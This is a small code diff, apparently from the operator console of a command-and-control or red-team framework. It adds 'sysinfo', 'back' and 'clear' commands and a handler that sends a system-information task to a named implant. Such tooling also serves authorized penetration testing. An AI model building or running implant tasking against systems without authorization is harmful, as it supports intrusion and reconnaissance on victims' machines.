@@ -57,6 +57,12 @@ def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -
     elif cmd == "selfdestruct":
         handle_selfdestruct(config, implant_id)
         return True
+    elif cmd == "sysinfo":
+        handle_sysinfo(config, implant_id)
+    elif cmd == "back":
+        return True
+    elif cmd == "clear":
+        print("\033[H\033[J")
     elif cmd.strip() == "":
         pass
     else:
@@ -206,3 +212,10 @@ def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
         return False, None
     
     return False, None
+
+def handle_sysinfo(config: OperatorConfig, implant_id: str) -> None:
+    """
+    Handle the sysinfo command, send a sysinfo task to the implant
+    """
+    logger.debug(f"Sending sysinfo task to {implant_id}")
+    add_task(config, Opcodes.SYSINFO.value, implant_id, [])
